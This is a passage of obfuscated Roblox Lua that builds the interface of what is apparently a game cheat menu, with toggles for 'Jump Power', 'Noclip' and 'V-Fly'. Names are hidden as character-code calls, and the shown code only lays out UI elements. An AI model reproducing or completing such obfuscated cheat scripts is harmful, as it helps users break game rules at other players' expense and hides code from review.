_llza[_sc(49,98,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,98,101)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(49,98,100)]);
_llza[_sc(49,98,101)][_sc(90,73,110,100,101,120)]=50;
_llza[_sc(49,98,101)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,98,101)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,98,101)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,98,101)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,98,101)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,98,101)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,98,101)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(49,98,101)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,98,101)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,98,101)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(49,98,102)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,98,101)]);
_llza[_sc(49,98,102)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(49,98,102)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(49,98,102)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(49,98,102)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(49,99,48)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,98,101)]);
_llza[_sc(49,99,48)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(49,99,48)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,99,48)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(49,99,48)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(49,99,48)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(49,99,49)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,99,48)]);
_llza[_sc(49,99,49)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(49,99,49)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(49,99,50)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(49,99,48)]);
_llza[_sc(49,99,50)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,99,50)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,99,50)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,99,50)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(49,99,50)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,99,50)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,99,51)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(49,99,50)]);
_llza[_sc(49,99,51)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(49,99,51)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(49,99,52)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(49,98,100)]);
_llza[_sc(49,99,52)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(49,99,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,99,52)][_sc(82,105,99,104,84,101,120,116)]=true;
_llza[_sc(49,99,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,99,52)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,99,52)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(49,99,52)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,99,52)][_sc(83,105,122,101)]=UDim2.new(0, 156, 0, 20);
_llza[_sc(49,99,52)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,99,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,99,52)][_sc(84,101,120,116)]=[[Jump Power]];
_llza[_sc(49,99,52)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,99,52)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(49,99,52)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,99,52)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(49,99,53)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,99,52)]);
_llza[_sc(49,99,53)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(49,99,54)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,99,52)]);
_llza[_sc(49,99,54)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,99,55)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,98,100)]);
_llza[_sc(49,99,55)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(49,99,56)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,98,100)]);
_llza[_sc(49,99,56)][_sc(90,73,110,100,101,120)]=55;
_llza[_sc(49,99,56)][_sc(83,105,122,101)]=UDim2.new(0, 70, 0, 20);
_llza[_sc(49,99,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,99,56)][_sc(78,97,109,101)]=[[JumppowerChanger]];
_llza[_sc(49,99,56)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,99,56)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,99,56)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(1, -70, 0, 0);
_llza[_sc(49,99,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,99,57)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,99,56)]);
_llza[_sc(49,99,57)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 2);
_llza[_sc(49,99,57)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(49,99,57)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(49,99,57)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(49,99,97)]=Instance.new(_sc(84,101,120,116,66,111,120),_llza[_sc(49,99,56)]);
_llza[_sc(49,99,97)][_sc(80,108,97,99,101,104,111,108,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(49,99,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(49,99,97)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,99,97)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(49,99,97)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,99,97)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(49,99,97)][_sc(80,108,97,99,101,104,111,108,100,101,114,84,101,120,116)]=[[(50)]];
_llza[_sc(49,99,97)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,99,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(49,99,97)][_sc(84,101,120,116)]=[[]];
_llza[_sc(49,99,97)][_sc(78,97,109,101)]=[[textbox]];
_llza[_sc(49,99,98)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,99,97)]);
_llza[_sc(49,99,98)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(49,99,98)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(49,99,98)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(49,99,99)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(49,99,97)]);
_llza[_sc(49,99,99)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,99,99)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,99,99)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,99,99)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(49,99,99)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,99,99)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,99,100)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(49,99,99)]);
_llza[_sc(49,99,100)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(49,99,100)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(49,99,101)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,99,97)]);
_llza[_sc(49,99,101)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,99,102)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,55,56)]);
_llza[_sc(49,99,102)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(49,99,102)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=5;
_llza[_sc(49,99,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,99,102)][_sc(78,97,109,101)]=[[Noclip]];
_llza[_sc(49,99,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,99,102)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,99,102)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(49,99,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,100,48)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(49,99,102)]);
_llza[_sc(49,100,48)][_sc(90,73,110,100,101,120)]=50;
_llza[_sc(49,100,48)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,100,48)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,100,48)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,100,48)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,100,48)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,100,48)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,100,48)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(49,100,48)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,100,48)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,100,48)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(49,100,49)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,100,48)]);
_llza[_sc(49,100,49)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(49,100,49)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(49,100,49)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(49,100,49)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(49,100,50)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,100,48)]);
_llza[_sc(49,100,50)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(49,100,50)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,100,50)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(49,100,50)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(49,100,50)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(49,100,51)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,100,50)]);
_llza[_sc(49,100,51)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(49,100,51)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(49,100,52)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(49,100,50)]);
_llza[_sc(49,100,52)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,100,52)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,100,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,100,52)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(49,100,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,100,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,100,53)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(49,100,52)]);
_llza[_sc(49,100,53)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(49,100,53)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(49,100,54)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(49,99,102)]);
_llza[_sc(49,100,54)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(49,100,54)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,100,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,100,54)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,100,54)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(49,100,54)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,100,54)][_sc(83,105,122,101)]=UDim2.new(0, 155, 0, 20);
_llza[_sc(49,100,54)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,100,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,100,54)][_sc(84,101,120,116)]=[[Noclip]];
_llza[_sc(49,100,54)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,100,54)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(49,100,54)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,100,54)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(49,100,55)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,100,54)]);
_llza[_sc(49,100,55)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(49,100,56)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,100,54)]);
_llza[_sc(49,100,56)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,100,57)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,99,102)]);
_llza[_sc(49,100,57)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(49,100,97)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,55,56)]);
_llza[_sc(49,100,97)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(49,100,97)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(49,100,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,100,97)][_sc(78,97,109,101)]=[[VFly]];
_llza[_sc(49,100,97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,100,97)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,100,97)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(49,100,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,100,98)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(49,100,97)]);
_llza[_sc(49,100,98)][_sc(90,73,110,100,101,120)]=50;
_llza[_sc(49,100,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,100,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,100,98)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,100,98)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,100,98)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,100,98)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,100,98)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(49,100,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,100,98)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,100,98)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(49,100,99)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,100,98)]);
_llza[_sc(49,100,99)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(49,100,99)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(49,100,99)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(49,100,99)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(49,100,100)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,100,98)]);
_llza[_sc(49,100,100)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(49,100,100)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,100,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(49,100,100)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(49,100,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(49,100,101)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,100,100)]);
_llza[_sc(49,100,101)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(49,100,101)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(49,100,102)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(49,100,100)]);
_llza[_sc(49,100,102)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,100,102)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,100,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,100,102)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(49,100,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,100,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,101,48)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(49,100,102)]);
_llza[_sc(49,101,48)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(49,101,48)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(49,101,49)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(49,100,97)]);
_llza[_sc(49,101,49)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(49,101,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,101,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,101,49)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,101,49)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(49,101,49)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,101,49)][_sc(83,105,122,101)]=UDim2.new(0, 156, 0, 20);
_llza[_sc(49,101,49)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,101,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,101,49)][_sc(84,101,120,116)]=[[V-Fly]];
_llza[_sc(49,101,49)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,101,49)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(49,101,49)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,101,49)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(49,101,50)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,101,49)]);
_llza[_sc(49,101,50)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(49,101,51)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,101,49)]);
_llza[_sc(49,101,51)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,101,52)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,100,97)]);
_llza[_sc(49,101,52)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(49,101,53)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,100,97)]);
_llza[_sc(49,101,53)][_sc(90,73,110,100,101,120)]=55;
_llza[_sc(49,101,53)][_sc(83,105,122,101)]=UDim2.new(0, 70, 0, 20);
_llza[_sc(49,101,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,101,53)][_sc(78,97,109,101)]=[[VFlyChanger]];
_llza[_sc(49,101,53)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,101,53)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,101,53)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(1, -70, 0, 0);
_llza[_sc(49,101,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,101,54)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,101,53)]);
_llza[_sc(49,101,54)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 2);
_llza[_sc(49,101,54)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(49,101,54)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(49,101,54)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(49,101,55)]=Instance.new(_sc(84,101,120,116,66,111,120),_llza[_sc(49,101,53)]);
_llza[_sc(49,101,55)][_sc(80,108,97,99,101,104,111,108,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(49,101,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(49,101,55)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,101,55)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(49,101,55)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,101,55)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(49,101,55)][_sc(80,108,97,99,101,104,111,108,100,101,114,84,101,120,116)]=[[(1)]];
_llza[_sc(49,101,55)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,101,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(49,101,55)][_sc(84,101,120,116)]=[[]];
_llza[_sc(49,101,55)][_sc(78,97,109,101)]=[[textbox]];
_llza[_sc(49,101,56)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,101,55)]);
_llza[_sc(49,101,56)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(49,101,56)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(49,101,56)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(49,101,57)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(49,101,55)]);
_llza[_sc(49,101,57)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
